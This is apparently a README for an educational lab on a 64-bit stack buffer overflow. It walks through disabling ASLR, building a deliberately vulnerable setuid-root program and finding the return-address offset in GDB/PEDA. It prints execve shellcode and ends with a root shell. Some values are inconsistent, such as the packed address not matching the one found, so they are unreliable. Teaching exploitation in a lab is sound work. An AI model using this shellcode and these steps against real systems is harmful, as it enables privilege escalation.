# 64-Bit Intel Buffer Overflow Vulnerability

A proof-of-concept buffer overflow vulnerability is explored in this repository. This project provides a step-through tutorial on obtaining root shell provileges through buffer overflow attacks.

## Getting Started

The environment used in this project was a Linux virtual machine (Ubuntu 16.04 LTS) running on VirtualBox. Also, an additional tool called Python Exploit Development Assistance (PEDA) for GDB is used. 

1. 64-Bit Ubuntu 16.04 LTS [download](https://www.ubuntu.com/download/desktop)
2. VirtualBox [download](https://www.virtualbox.org/wiki/Downloads)
3. PEDA [download](https://github.com/longld/peda)

## Overview (Intel x86-64)

There are several differences between 32-bit and 64-bit Intel architectures. Some of these differences include:

1. General purpose registers have been expanded to 64-bit (RAX, RBX, RCX, RDX, RSI, and RDI).
2. Base pointer and stack pointer have been expanded to 64-bit as RBP and RSP, respectfully.
3. The set of general-purpose registers are expanded from 8 to 16 (R8 to R15).
4. Push/pop on the stack are 8-bytes wide.
5. Pointers and long integers are 64-bits long. Integer arithmetic operations support 8, 16, 32, and 64-bit data types.
6. Much of the program state is held in registers rather than on the stack. Integers and pointer procedure argumens (up to 6) are passed via registers. Some procedures do not need to access the stack at all. Because of this, no stack frames are generated and the procedure prolog is not required in most cases (as seen in 32-bit architectures).

## Preparing The Machine

Modern-day machines are equipped with several protection schemes that aim to prevent buffer overflow attacks. It is necessary to disable those protection schemes in order to observe a successful buffer overflow attack.

### Address-Space Layout Randomization (ASLR)

ASLR is computer security technique that provides protection against memory exploitation vulnerabilities. It works by rearranging the address space positions of key data areas of a process, including the base of the executable and the positions of the data segment features (stack, heap, etc.). By having this protection, it is much more difficult for a hacker to guess the exact address to target (e.g. starting address of their malicious code). 

In Ubuntu, this protection was disabled using the following command with ***root*** privileges. 

```
# sysctl -w kernel.randomize_va_space=0
```

***Note***: The above command is only temporary and will reset back if the machine is power cycled. 

The following command is used to confirm that ASLR is indeed turned off (set to 0):

```
$ cat /proc/sys/kernel/randomize_va_space
```

## Working With The Code

### exploit.py

Python script that generates a text file (name "badfile") with the corresponding string that is used to overflow the buffer. It consists of the location of the shellcode and padding.

### vulnerable.c

This C source code is the vulnerable program which reads in the "badfile" to an insufficiently sized buffer (80-bytes) without bounds checking. 

```
Compile:

# gcc -fno-stack-protector -z execstack -o vulnerable vulnerable.c
```

### getenvaddr.c

This C source code returns the address of the environmental variable specified as an argument. 

```
Compile:

# gcc -o getenvaddr getenvaddr.c
```

## Find Parameters

Some extra information is required to successfully exploit the buffer overflow vulnerability.

1. The offset address of RIP
2. Address of shellcode


### Finding RIP Offset Address

First we have to run 'exploit.py' to generate the badfile.

```
$ python exploit.py
```

Then, load the compiled 'vulnerable' executable into GDB. 

```
$ gdb vulnerable
```

Using PEDA, we are able to generate a cyclic pattern of 400-bytes (size of buffer). 

```
$ gdb 
gdb-peda$ pattern_create 400 badfile.txt
Writing pattern of 400 chars to filename "badfile.txt"
```

We can example the contents of RSP:

```
gdb-peda$ r < badfile.txt
Try to exec /bin/sh
Read 400 bytes. buf is AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKA�
Returned properly.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7b042c0 (<__write_nocancel+7>:	cmp    rax,0xfffffffffffff001)
RDX: 0x7ffff7dd3780 --> 0x0 
RSI: 0x602010 ("Returned properly.\n is AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKA\220\001\n")
RDI: 0x1 
RBP: 0x416841414c414136 ('6AALAAhA')
RSP: 0x7fffffffdb18 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%h"...)
RIP: 0x4005ff (<vuln+73>:	ret)
R8 : 0x2e796c7265706f72 ('roperly.')
R9 : 0x77 ('w')
R10: 0x194 
R11: 0x246 
R12: 0x4004c0 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffdc10 ("A%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%y \340\377\377\377\177")
R14: 0x0 
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4005f4 <vuln+62>:	call   0x400470 <puts@plt>
   0x4005f9 <vuln+67>:	mov    eax,0x0
   0x4005fe <vuln+72>:	leave  
=> 0x4005ff <vuln+73>:	ret    
   0x400600 <main>:	push   rbp
   0x400601 <main+1>:	mov    rbp,rsp
   0x400604 <main+4>:	sub    rsp,0x10
   0x400608 <main+8>:	mov    DWORD PTR [rbp-0x4],edi
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdb18 ("A7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%h"...)
0008| 0x7fffffffdb20 ("AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%"...)
0016| 0x7fffffffdb28 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA"...)
0024| 0x7fffffffdb30 ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%O"...)
0032| 0x7fffffffdb38 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%"...)
0040| 0x7fffffffdb40 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA"...)
0048| 0x7fffffffdb48 ("ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%S"...)
0056| 0x7fffffffdb50 ("AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%"...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004005ff in vuln ()

```

The cyclic pattern can be seen on the stack. The offset is then easily found using PEDA:

```
gdp-peda$ x/wx $rsp
0x7fffffffdb18:	0x41413741


gdp-peda$ pattern_offsett 0x41413741
1094793025 found at offset: 104
```

PEDA determined that the offset of RIP is at 104. The 'exploit.py' file must be updated to accomodate this offset.

```
buf += "A"*104			# offset to RIP
```

### Shellcode and getenvaddr

After determining and verifying the offer to RIP, we must override RIP to point to our malicious shellcode. We store shellcode on the stack via an environmental variable and find its address on the stack using getenvaddr. 

```
$ export PWN=`python -c 'print "\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"'`

$ ./getenvaddr PWN ./vulnerable
PWN will be at 0x7fffffffed23
```

We now know the address of the shellcode on the stack, now we need to update the exploit.

```
buf += pack("<Q", 0x7fffffffed8)
```

Also, remember to change the permission of vulnerable to set UID to root to obtain a root shell.

```
# chown root vulnerable
# chmod 4755 vulnerable
```

## Start The Exploit

```
$ python exploit.py
$ (cat badfile.txt ; cat) | ./vulnerable
Try to exec /bin/sh
Read 112 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
Returned properly.
whoami
root
```

Our exploit was successful in obtaining a root shell!









